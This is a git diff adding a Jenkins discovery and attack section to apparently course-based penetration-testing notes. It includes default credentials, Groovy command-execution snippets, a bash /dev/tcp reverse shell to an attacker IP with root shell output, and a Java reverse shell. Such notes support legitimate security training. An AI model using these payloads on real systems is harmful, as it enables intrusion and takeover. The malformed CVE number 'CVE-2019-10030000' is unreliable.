@@ -6,6 +6,12 @@
     - [Tomcat Manager - Login Brute Force](#tomcat-manager---login-brute-force)
     - [Tomcat Manager - WAR File Upload](#tomcat-manager---war-file-upload)
     - [CVE-2020-1938: Ghostcat](#cve-2020-1938-ghostcat)
+  - [Jenkins - Discovery \& Enum](#jenkins---discovery--enum)
+    - [Discovery/Footprinting](#discoveryfootprinting)
+    - [Enumeration](#enumeration-1)
+  - [Jenkins - Attack](#jenkins---attack)
+    - [Script Console](#script-console)
+    - [Miscellaneous Vulns](#miscellaneous-vulns)
 
 ---
 
@@ -490,3 +496,83 @@ Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
 
 </web-app>
 ```
+
+## Jenkins - Discovery & Enum
+
+### Discovery/Footprinting
+
+Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves. Jenkins can use a local database, LDAP, UNIX user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.
+
+### Enumeration
+
+![attacking servlet containers 5](../../../images/attacking_servlet_containers5.png)
+
+The default installation typically uses Jenkins' database to store credentials and does not allow users to register an account. You can fingerprint Jenkins quickly by the tellable login page.
+
+![attacking servlet containers 6](../../../images/attacking_servlet_containers6.png)
+
+You may encounter a Jenkins instance that uses weak or default credentials such as ```admin:admin``` or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal pentest.
+
+## Jenkins - Attack
+
+### Script Console
+
+The script console allows a user to run Apache Groovy scripts, which are an OOP Java-compatible language. The language is similar to Python and Ruby. Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed.
+
+Using this script console, it is possible to run arbitrary commands, functioning similarly to a web shell. For example, you can use the following snipped to run the ```id``` command.
+
+```groovy
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+```
+
+There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or this [Metasploit](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) module.
+
+```groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+Running the above commands results in a reverse shell connection.
+
+```bash
+d41y@htb[/htb]$ nc -lvnp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844
+
+id
+
+uid=0(root) gid=0(root) groups=0(root)
+
+/bin/bash -i
+
+root@app02:/var/lib/jenkins3#
+```
+
+Against a Windows host, you could attempt to add an user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1. You could run commands on a Windows-based Jenkins install using this snippet.
+
+```groovy
+def cmd = "cmd.exe /c dir".execute();
+println("${cmd.text}");
+```
+
+You could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host, swapping out localhost and the port of your IP address and listener port.
+
+```groovy
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+### Miscellaneous Vulns
+
+Several RCEs exist in various versions of Jenkins. One recent exploit combines two vulns, CVE-2018-1999002 and CVE-2019-10030000 to achieve pre-authenticated RCE, bypassing script security sandbox protection during script compilation. Public exploit PoCs exist to exploit a flaw in Jenkins dynamic routing to bypass the Overall / Read ACL and use Groovy to download and execute a malicious JAR file. This flaw allows users with read permissions to bypass sandbox protections and execute code on the Jenkins master server. This exploit works against Jenkins verion 2.137.
+
+Another vuln exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js. This vuln requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.
